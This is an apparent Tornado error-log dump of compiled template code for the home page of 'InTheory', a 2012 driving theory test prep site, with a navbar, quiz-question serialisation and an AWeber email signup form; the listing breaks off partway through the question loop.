508      _append('"/>\n</div>\n</script>\n<script id="email-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<center>\n<p>Leave your email and we\'ll let you know when we launch!</p>\n<form method="post" class="af-form-wrapper" action="http://www.aweber.com/scripts/addlead.pl" >\n<div style="display: none;">\n<input type="hidden" name="meta_web_form_id" value="677441365" />\n<input type="hidden" name="meta_split_id" value="" />\n<input type="hidden" name="listname" value="intheory" />\n<input type="hidden" name="redirect" value="http://www.aweber.com/thankyou-coi.htm?m=video" id="redirect_b3be9783c304109a8d9d9ca013e7b651" />\n<input type="hidden" name="meta_adtracking" value="Waiting_List_/_Splash" />\n<input type="hidden" name="meta_message" value="1" />\n<input type="hidden" name="meta_required" value="name,email" />\n<input type="hidden" name="meta_tooltip" value="" />\n</div>\n<div id="af-form-677441365" class="af-form"><div id="af-body-677441365" class="af-body af-standards">\n<div class="af-element">\n<div class="af-textWrap"></br>\n<input id="awf_field-39151245" type="text" name="name" class="text" placeholder="Enter Your Name" tabindex="500" />\n</div>\n<div class="af-clear"></div></div>\n<div class="af-element">\n<div class="af-textWrap"><input class="text" id="awf_field-39151246" type="text" name="email" placeholder="Enter Your Email" tabindex="501" />\n</div><div class="af-clear"></div>\n</div>\n<input name="submit" class="btn btn-primaryw" type="submit" value="Submit" tabindex="502" />\n</br>\n<a href="/login">or connect with Facebook</a>\n</div>\n</br></br>\n<div class="af-element privacyPolicy" style="text-align: center"><p>We respect your <a title="Privacy Policy" href="http://www.aweber.com/permission.htm" target="_blank">email privacy</a></p>\n<div class="af-clear"></div>\n</div>\n</div>\n</div>\n<div style="display: none;"><img src="http://forms.aweber.com/form/displays.htm?id=bOzsLCyMzGys" alt="" /></div>\n</form>\n</center>\n<script type="text/javascript">\n<!--\n(function() {\nvar IE = /*@cc_on!@*/false;\nif (!IE) { return; }\nif (document.compatMode && document.compatMode == \'BackCompat\') {\nif (document.getElementById("af-form-677441365")) {\ndocument.getElementById("af-form-677441365").className = \'af-form af-quirksMode\';\n}\nif (document.getElementById("af-body-677441365")) {\ndocument.getElementById("af-body-677441365").className = "af-body inline af-quirksMode";\n}\nif (document.getElementById("af-header-677441365")) {\ndocument.getElementById("af-header-677441365").className = "af-header af-quirksMode";\n}\nif (document.getElementById("af-footer-677441365")) {\ndocument.getElementById("af-footer-677441365").className = "af-footer af-quirksMode";\n}\n}\n})();\n-->\n</script>\n</div>\n</div>\n</script>\n')  # home.html:158 (via base.html:94)
509      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:106
510      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:home.html code:
  1  def _execute():  # base.html:0
  2      _buffer = []  # base.html:0
  3      _append = _buffer.append  # base.html:0
  4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
  5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
  6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
  7      _tmp = static_url('css/base.css')  # base.html:25
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
  9      else: _tmp = _utf8(str(_tmp))  # base.html:25
 10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
 11      _append(_tmp)  # base.html:25
 12      _append('" />\n')  # base.html:26
 13      for css in kwargs['css_deps']:  # base.html:26
 14          _append('\n<link href="')  # base.html:27
 15          _tmp = static_url(css)  # base.html:27
 16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
 17          else: _tmp = _utf8(str(_tmp))  # base.html:27
 18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
 19          _append(_tmp)  # base.html:27
 20          _append('" rel="stylesheet">\n')  # base.html:28
 21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n</head>\n<body >\n')  # base.html:44
 22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:53 (via base.html:44)
 23      _tmp = static_url('imgs/logo.png')  # base.html:53 (via base.html:44)
 24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:53 (via base.html:44)
 25      else: _tmp = _utf8(str(_tmp))  # base.html:53 (via base.html:44)
 26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:53 (via base.html:44)
 27      _append(_tmp)  # base.html:53 (via base.html:44)
 28      _append('"></a>\n<div class="pull-right">\n')  # base.html:55 (via base.html:44)
 29      if not current_user:  # base.html:55 (via base.html:44)
 30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:57 (via base.html:44)
 31      else:  # base.html:57 (via base.html:44)
 32          _append('\n<ul class="nav nav-pills">\n')  # base.html:59 (via base.html:44)
 33          if current_user['moderator']:  # base.html:59 (via base.html:44)
 34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:61 (via base.html:44)
 35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:68 (via base.html:44)
 36          _tmp = static_url('imgs/user.png')  # base.html:68 (via base.html:44)
 37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:68 (via base.html:44)
 38          else: _tmp = _utf8(str(_tmp))  # base.html:68 (via base.html:44)
 39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:68 (via base.html:44)
 40          _append(_tmp)  # base.html:68 (via base.html:44)
 41          _append('"></a>\n')  # base.html:69 (via base.html:44)
 42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:74 (via base.html:44)
 43      _append('\n')  # base.html:76
 44      _append('\n<div class="container">\n<div class="hero-unit">\n<div class="hero-unit1">\n<div class="row-fluid">\n<div class="columnA pull-left">\n<h2>Pass your theory test.<br>Guaranteed.</h2>\n<ul>\n<li>The simplest and fastest way to pass your test.</li>\n<li>Use cool new learning techniques to help you remember the details.</li>\n<li>Don\'t pass first time? Get your money back.</li>\n</ul></br>\n<p><a id="get-started-btn" class="btn btn-block btn-success btn-large">Get Started Today</a></p>\n</div>\n<div class="columnB pull-right">\n</br>\n<div id="questions" data-questions=\n\'[{ "question":"')  # home.html:21 (via base.html:76)
 45      _tmp = kwargs["questions"][0].question  # home.html:21 (via base.html:76)
 46      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 47      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 48      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 49      _append(_tmp)  # home.html:21 (via base.html:76)
 50      _append('","options": ["')  # home.html:21 (via base.html:76)
 51      _tmp = kwargs["questions"][0].options[0]  # home.html:21 (via base.html:76)
 52      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 53      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 54      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 55      _append(_tmp)  # home.html:21 (via base.html:76)
 56      _append('", "')  # home.html:21 (via base.html:76)
 57      _tmp = kwargs["questions"][0].options[1]  # home.html:21 (via base.html:76)
 58      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 59      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 60      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 61      _append(_tmp)  # home.html:21 (via base.html:76)
 62      _append('", "')  # home.html:21 (via base.html:76)
 63      _tmp = kwargs["questions"][0].options[2]  # home.html:21 (via base.html:76)
 64      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 65      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 66      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 67      _append(_tmp)  # home.html:21 (via base.html:76)
 68      _append('", "')  # home.html:21 (via base.html:76)
 69      _tmp = kwargs["questions"][0].options[3]  # home.html:21 (via base.html:76)
 70      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 71      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 72      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 73      _append(_tmp)  # home.html:21 (via base.html:76)
 74      _append('"],"answer": ')  # home.html:21 (via base.html:76)
 75      _tmp = kwargs["questions"][0].answer  # home.html:21 (via base.html:76)
 76      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 77      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 78      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 79      _append(_tmp)  # home.html:21 (via base.html:76)
 80      _append('},{ "question":"')  # home.html:21 (via base.html:76)
 81      _tmp = kwargs["questions"][1].question  # home.html:21 (via base.html:76)
 82      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 83      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 84      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 85      _append(_tmp)  # home.html:21 (via base.html:76)
 86      _append('","options": ["')  # home.html:21 (via base.html:76)
 87      _tmp = kwargs["questions"][1].options[0]  # home.html:21 (via base.html:76)
 88      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 89      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 90      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 91      _append(_tmp)  # home.html:21 (via base.html:76)
 92      _append('", "')  # home.html:21 (via base.html:76)
 93      _tmp = kwargs["questions"][1].options[1]  # home.html:21 (via base.html:76)
 94      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 95      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 96      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 97      _append(_tmp)  # home.html:21 (via base.html:76)
 98      _append('", "')  # home.html:21 (via base.html:76)
 99      _tmp = kwargs["questions"][1].options[2]  # home.html:21 (via base.html:76)
100      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
101      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
102      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
103      _append(_tmp)  # home.html:21 (via base.html:76)
104      _append('", "')  # home.html:21 (via base.html:76)
105      _tmp = kwargs["questions"][1].options[3]  # home.html:21 (via base.html:76)
106      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
107      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
108      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
109      _append(_tmp)  # home.html:21 (via base.html:76)
110      _append('"],"answer": ')  # home.html:21 (via base.html:76)
111      _tmp = kwargs["questions"][1].answer  # home.html:21 (via base.html:76)
112      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
113      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
114      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
115      _append(_tmp)  # home.html:21 (via base.html:76)
116      _append('}, { "question":"')  # home.html:21 (via base.html:76)
117      _tmp = kwargs["questions"][2].question  # home.html:21 (via base.html:76)
118      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
119      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
120      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
121      _append(_tmp)  # home.html:21 (via base.html:76)
122      _append('","options": ["')  # home.html:21 (via base.html:76)
123      _tmp = kwargs["questions"][2].options[0]  # home.html:21 (via base.html:76)
124      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
125      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
126      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
127      _append(_tmp)  # home.html:21 (via base.html:76)
128      _append('", "')  # home.html:21 (via base.html:76)
129      _tmp = kwargs["questions"][2].options[1]  # home.html:21 (via base.html:76)
130      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
131      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
132      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
133      _append(_tmp)  # home.html:21 (via base.html:76)
134      _append('", "')  # home.html:21 (via base.html:76)
135      _tmp = kwargs["questions"][2].options[2]  # home.html:21 (via base.html:76)
136      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
137      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
138      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
139      _append(_tmp)  # home.html:21 (via base.html:76)
140      _append('", "')  # home.html:21 (via base.html:76)
141      _tmp = kwargs["questions"][2].options[3]  # home.html:21 (via base.html:76)
142      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
143      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
144      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
145      _append(_tmp)  # home.html:21 (via base.html:76)
146      _append('"],"answer": ')  # home.html:21 (via base.html:76)
147      _tmp = kwargs["questions"][2].answer  # home.html:21 (via base.html:76)
148      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
149      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
150      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
151      _append(_tmp)  # home.html:21 (via base.html:76)
152      _append('},{ "question":"')  # home.html:21 (via base.html:76)
153      _tmp = kwargs["questions"][3].question  # home.html:21 (via base.html:76)
154      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
155      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
156      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
157      _append(_tmp)  # home.html:21 (via base.html:76)
158      _append('","options": ["')  # home.html:21 (via base.html:76)
159      _tmp = kwargs["questions"][3].options[0]  # home.html:21 (via base.html:76)
160      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
161      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
162      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
163      _append(_tmp)  # home.html:21 (via base.html:76)
164      _append('", "')  # home.html:21 (via base.html:76)
165      _tmp = kwargs["questions"][3].options[1]  # home.html:21 (via base.html:76)
166      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
167      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
168      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
169      _append(_tmp)  # home.html:21 (via base.html:76)
170      _append('", "')  # home.html:21 (via base.html:76)
171      _tmp = kwargs["questions"][3].options[2]  # home.html:21 (via base.html:76)
172      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
173      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
174      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
175      _append(_tmp)  # home.html:21 (via base.html:76)
176      _append('", "')  # home.html:21 (via base.html:76)
177      _tmp = kwargs["questions"][3].options[3]  # home.html:21 (via base.html:76)
178      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
179      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
180      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
181      _append(_tmp)  # home.html:21 (via base.html:76)
182      _append('"],"answer": ')  # home.html:21 (via base.html:76)
183      _tmp = kwargs["questions"][3].answer  # home.html:21 (via base.html:76)
184      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
185      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
186      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
187      _append(_tmp)  # home.html:21 (via base.html:76)
188      _append('}, { "question":"')  # home.html:21 (via base.html:76)
189      _tmp = kwargs["questions"][4].question  # home.html:21 (via base.html:76)
190      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
191      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
192      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
193      _append(_tmp)  # home.html:21 (via base.html:76)
194      _append('","options": ["')  # home.html:21 (via base.html:76)
195      _tmp = kwargs["questions"][4].options[0]  # home.html:21 (via base.html:76)
196      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
197      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
198      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
199      _append(_tmp)  # home.html:21 (via base.html:76)
200      _append('", "')  # home.html:21 (via base.html:76)
201      _tmp = kwargs["questions"][4].options[1]  # home.html:21 (via base.html:76)
202      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
203      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
204      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
205      _append(_tmp)  # home.html:21 (via base.html:76)
206      _append('", "')  # home.html:21 (via base.html:76)
207      _tmp = kwargs["questions"][4].options[2]  # home.html:21 (via base.html:76)
208      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
209      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
210      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
211      _append(_tmp)  # home.html:21 (via base.html:76)
212      _append('", "')  # home.html:21 (via base.html:76)
213      _tmp = kwargs["questions"][4].options[3]  # home.html:21 (via base.html:76)
214      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
215      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
216      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
217      _append(_tmp)  # home.html:21 (via base.html:76)
218      _append('"],"answer": ')  # home.html:21 (via base.html:76)
219      _tmp = kwargs["questions"][4].answer  # home.html:21 (via base.html:76)
220      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
221      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
222      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
223      _append(_tmp)  # home.html:21 (via base.html:76)
224      _append('},{ "question":"')  # home.html:21 (via base.html:76)
225      _tmp = kwargs["questions"][5].question  # home.html:21 (via base.html:76)
226      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
227      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
228      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
229      _append(_tmp)  # home.html:21 (via base.html:76)
230      _append('","options": ["')  # home.html:21 (via base.html:76)
231      _tmp = kwargs["questions"][5].options[0]  # home.html:21 (via base.html:76)
232      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
233      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
234      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
235      _append(_tmp)  # home.html:21 (via base.html:76)
236      _append('", "')  # home.html:21 (via base.html:76)
237      _tmp = kwargs["questions"][5].options[1]  # home.html:21 (via base.html:76)
238      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
239      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
240      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
241      _append(_tmp)  # home.html:21 (via base.html:76)
242      _append('", "')  # home.html:21 (via base.html:76)
243      _tmp = kwargs["questions"][5].options[2]  # home.html:21 (via base.html:76)
244      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
245      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
246      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
247      _append(_tmp)  # home.html:21 (via base.html:76)
248      _append('", "')  # home.html:21 (via base.html:76)
249      _tmp = kwargs["questions"][5].options[3]  # home.html:21 (via base.html:76)
250      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
251      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
252      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
253      _append(_tmp)  # home.html:21 (via base.html:76)
254      _append('"],"answer": ')  # home.html:21 (via base.html:76)
255      _tmp = kwargs["questions"][5].answer  # home.html:21 (via base.html:76)
256      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
257      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
258      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
259      _append(_tmp)  # home.html:21 (via base.html:76)
260      _append('}, { "question":"')  # home.html:21 (via base.html:76)
261      _tmp = kwargs["questions"][6].question  # home.html:21 (via base.html:76)
262      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
263      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
264      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
265      _append(_tmp)  # home.html:21 (via base.html:76)
266      _append('","options": ["')  # home.html:21 (via base.html:76)
267      _tmp = kwargs["questions"][6].options[0]  # home.html:21 (via base.html:76)
268      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
269      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
270      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
271      _append(_tmp)  # home.html:21 (via base.html:76)
272      _append('", "')  # home.html:21 (via base.html:76)
273      _tmp = kwargs["questions"][6].options[1]  # home.html:21 (via base.html:76)
274      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
275      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
276      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
277      _append(_tmp)  # home.html:21 (via base.html:76)
278      _append('", "')  # home.html:21 (via base.html:76)
279      _tmp = kwargs["questions"][6].options[2]  # home.html:21 (via base.html:76)
280      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
281      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
282      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
283      _append(_tmp)  # home.html:21 (via base.html:76)
284      _append('", "')  # home.html:21 (via base.html:76)
285      _tmp = kwargs["questions"][6].options[3]  # home.html:21 (via base.html:76)
286      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
287      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
288      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
289      _append(_tmp)  # home.html:21 (via base.html:76)
290      _append('"],"answer": ')  # home.html:21 (via base.html:76)
291      _tmp = kwargs["questions"][6].answer  # home.html:21 (via base.html:76)
292      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
293      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
294      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
295      _append(_tmp)  # home.html:21 (via base.html:76)
296      _append('},{ "question":"')  # home.html:21 (via base.html:76)
297      _tmp = kwargs["questions"][7].question  # home.html:21 (via base.html:76)
298      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
299      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
300      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
301      _append(_tmp)  # home.html:21 (via base.html:76)
302      _append('","options": ["')  # home.html:21 (via base.html:76)
303      _tmp = kwargs["questions"][7].options[0]  # home.html:21 (via base.html:76)
304      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
305      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
306      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
307      _append(_tmp)  # home.html:21 (via base.html:76)
308      _append('", "')  # home.html:21 (via base.html:76)
309      _tmp = kwargs["questions"][7].options[1]  # home.html:21 (via base.html:76)
310      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
311      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
312      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
313      _append(_tmp)  # home.html:21 (via base.html:76)
314      _append('", "')  # home.html:21 (via base.html:76)
315      _tmp = kwargs["questions"][7].options[2]  # home.html:21 (via base.html:76)
316      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
317      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
318      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
319      _append(_tmp)  # home.html:21 (via base.html:76)
320      _append('", "')  # home.html:21 (via base.html:76)
321      _tmp = kwargs["questions"][7].options[3]  # home.html:21 (via base.html:76)
322      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
323      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
324      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
325      _append(_tmp)  # home.html:21 (via base.html:76)
326      _append('"],"answer": ')  # home.html:21 (via base.html:76)
327      _tmp = kwargs["questions"][7].answer  # home.html:21 (via base.html:76)
328      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
329      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
330      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
331      _append(_tmp)  # home.html:21 (via base.html:76)
332      _append('}, { "question":"')  # home.html:21 (via base.html:76)
333      _tmp = kwargs["questions"][8].question  # home.html:21 (via base.html:76)
334      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
335      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
